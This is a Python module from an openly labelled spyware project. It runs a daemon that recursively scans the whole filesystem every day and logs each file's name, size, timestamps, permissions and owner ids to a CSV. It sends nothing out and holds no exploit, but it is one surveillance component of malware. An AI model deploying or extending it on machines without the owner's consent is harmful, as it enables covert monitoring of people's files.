#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file gets all filenames and metadata.
#    Copyright (C) 2021, 2022, 2024  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file gets all filenames and metadata.

~# python3 FilesLogger.py filesSpy.conf

>>> from os import environ
>>> environ['filesSpy.conf'] = 'filesSpy.conf'
>>> from SpyWare.FilesLogger import filesSpy
>>> filesSpy()                  # (using env) OR
>>> filesSpy('filesSpy.conf')   # (using config file name) OR
>>> filesSpy(argv=["FilesLogger.py", "filesSpy.conf"]) # (using argv)
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "FilesLogger", "main", "config_load"]

from os.path import normcase, isfile, join, dirname, exists
from os import scandir, DirEntry, environ
from configparser import ConfigParser
from time import strftime, localtime
from sys import argv, exit
from stat import filemode
from typing import List
from time import sleep
from enum import Enum


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    save_filename: str = "files.csv"

    file_interval = 0.1
    directory_interval = 1
    scan_interval = 86400


def config_load(filename: str = None, argv: List[str] = argv) -> int:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()
    default_file_name = "filesSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "files.csv"
    )
    CONFIGURATIONS.file_interval = float(
        CONFIG.get("TIME", {}).get("file_interval", "0.1")
    )
    CONFIGURATIONS.directory_interval = float(
        CONFIG.get("TIME", {}).get("directory_interval", "1")
    )
    CONFIGURATIONS.scan_interval = float(
        CONFIG.get("TIME", {}).get("scan_interval", "86400")
    )
    return 0


class Daemon:

    """
    This class implements the loop to get filename and metadata.
    """

    def __init__(self):
        self.interval = CONFIGURATIONS.scan_interval
        self.fileslogger = FilesLogger()
        self.run = True

    def run_for_ever(self):

        """
        This function implements the loop to get filename and metadata.
        """

        fileslogger = self.fileslogger
        interval = self.interval

        while self.run:
            fileslogger.get_filenames(normcase("/"))
            if self.run:
                sleep(interval)


class FilesLogger:

    """
    This class gets filenames and metadata.
    """

    def __init__(self):
        self.directory_interval = CONFIGURATIONS.directory_interval
        self.interval = CONFIGURATIONS.file_interval
        filename = self.filename = CONFIGURATIONS.save_filename
        self.launch()
        self.data_file = open(filename)
        self.data = b""

    def launch(self):

        """
        This function starts the file logger.
        """

        filename = self.filename

        if not isfile(filename):
            with open(filename, "w") as csvfile:
                csvfile.write(
                    "name,size,access_time,modif_time,"
                    "permissions,directory,is_uid,is_gid,"
                    "modification_time\n"
                )

    def get_filenames(self, directory: str) -> None:

        """
        This function gets recursives filenames.
        """

        interval = self.interval
        metadata = self.get_data
        get_filenames = self.get_filenames

        for file in scandir(directory):
            if file.is_dir():

                sleep(interval)
                try:
                    get_filenames(join(directory, file.name))
                except PermissionError as e:
                    print(e)

            elif file.is_file():

                sleep(interval)
                try:
                    metadata(file, directory)
                except Exception as e:
                    print(e)

        self.persistent_save()

    def get_data(self, file: DirEntry, directory: str) -> None:

        """
        This function gets metadata and filename.
        """

        metadata = file.stat()
        permissions = filemode(metadata.st_mode)

        data = {
            "name": file.name,
            "size": str(metadata.st_size),
            "access_time": strftime(
                "%Y-%m-%d %H:%M:%S", localtime(metadata.st_atime)
            ),
            "modif_time": strftime(
                "%Y-%m-%d %H:%M:%S", localtime(metadata.st_mtime)
            ),
            "permissions": permissions,
            "directory": directory,
            "is_uid": str(metadata.st_uid),
            "is_gid": str(metadata.st_gid),
            "modification_time": strftime(
                "%Y-%m-%d %H:%M:%S", localtime(metadata.st_ctime)
            ),
        }

        self.save(data)

    def save(self, data: dict) -> int:

        """
        This function saves metadata if isn't save before.
        """

        new_line = ",".join(data.values()) + "\n"
        data_file = self.data_file
        data_file.seek(0)
        readline = data_file.readline

        data = readline()

        while data:
            if new_line == data:
                return None
            data = readline()

        self.data += new_line.encode()

    def persistent_save(self) -> None:

        """
        This function saves data in file.
        """

        if not self.data:
            return None

        filename = self.filename
        self.data_file.close()

        with open(filename, "ab") as file:
            file.write(self.data)

        self.data = b""
        self.data_file = open(filename)


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function executes this script from the command line.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()

    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0


if __name__ == "__main__":
    print(copyright)
    exit(main())
